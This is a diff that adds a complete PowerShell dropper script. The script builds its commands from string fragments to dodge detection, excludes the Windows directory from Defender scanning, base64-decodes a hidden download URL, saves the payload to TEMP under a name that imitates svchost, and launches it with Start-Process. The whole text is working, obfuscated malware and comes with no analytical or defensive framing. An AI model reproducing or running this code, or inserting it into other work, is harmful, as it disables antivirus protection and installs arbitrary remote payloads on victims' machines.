@@ -1,0 +1,25 @@
+﻿function Get-CommandPart1 { return 'Add' + '-MpPreference' }
+function Get-CommandPart2 { return 'Exclusion' + 'Path' }
+function Decode-Base64 { param([string]$data); [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($data)) }
+
+$sysDir = "$env:W" + "IND" + "OWS"
+& (Get-CommandPart1) -$(Get-CommandPart2) $sysDir
+
+$urlEncoded = "aHR0cHM6Ly9CMm4uaXIvbWcxOTMx"
+$downloadUrl = Decode-Base64 $urlEncoded
+
+$sysLikeName = "svchost" + [System.IO.Path]::GetRandomFileName().Substring(0,3) + ".exe"
+$outputPath = "$env:T" + "EMP\" + $sysLikeName
+
+$webRequest = [System.Net.HttpWebRequest]::Create($downloadUrl)
+$response = $webRequest.GetResponse()
+$dataStream = $response.GetResponseStream()
+$fileStream = New-Object IO.FileStream($outputPath, [IO.FileMode]::Create)
+$dataBuffer = New-Object byte[] 8192
+while (($bytesRead = $dataStream.Read($dataBuffer, 0, $dataBuffer.Length)) -gt 0) {
+    $fileStream.Write($dataBuffer, 0, $bytesRead)
+}
+$fileStream.Close()
+
+$startCmd = "St" + "art" + "-Pro" + "cess"
+&($startCmd) -FilePath $outputPath
